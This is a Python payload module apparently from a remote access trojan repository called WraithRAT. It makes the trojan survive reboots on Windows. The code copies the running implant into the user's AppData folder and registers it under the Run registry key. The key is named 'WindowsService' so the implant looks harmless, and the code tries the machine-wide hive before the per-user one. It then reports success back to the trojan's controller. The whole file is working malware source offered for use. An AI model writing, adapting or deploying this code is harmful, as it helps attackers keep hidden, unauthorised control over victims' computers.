# Part of the WraithRAT Payloads repository
# Each payload must be placed in the server/assets/wraith-scripts directory
# Note: Comments should be removed so less data needs to be sent to the wraith
# Warning: This module uses additional libraries: shutil and winreg. This should not be a problem and appears to work in both a clean Python install and PyInstaller

def script_main(wraith, cmdline):
	try:

		if os.name == 'nt':	
			import shutil, winreg

			destpath = (cmdline+" ").split(" ")[1:]

			selfpath = os.path.abspath(sys.argv[0])
			if not os.path.exists(selfpath):
				wraith.putresult("ERROR", "The wraith file was moved or has gone missing!")
				return
				
			try: newpath = shutil.copy(selfpath, (os.environ["appdata"] if not destpath[0] else destpath[0]))
			except shutil.SameFileError: newpath = os.path.join((os.environ["appdata"] if not destpath[0] else destpath[0]), sys.argv[0])

			try:
				startupkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", reserved=0, access = winreg.KEY_ALL_ACCESS)
				winreg.SetValueEx(startupkey,"WindowsService",0,winreg.REG_SZ,newpath)
				winreg.CloseKey(startupkey)
			except:
				startupkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", reserved=0, access = winreg.KEY_ALL_ACCESS)
				winreg.SetValueEx(startupkey,"WindowsService",0,winreg.REG_SZ,newpath)
				winreg.CloseKey(startupkey)
			
			wraith.putresult("SUCCESS", "Successfully installed wraith to run on startup at `{}`!".format(newpath))
			return
		else:
			wraith.putresult("ERROR", "Not running on a supported system, cannot install on startup.")
				
	except Exception as e:
	    wraith.putresult("ERROR", "Error while installing on startup ({}).".format(e))
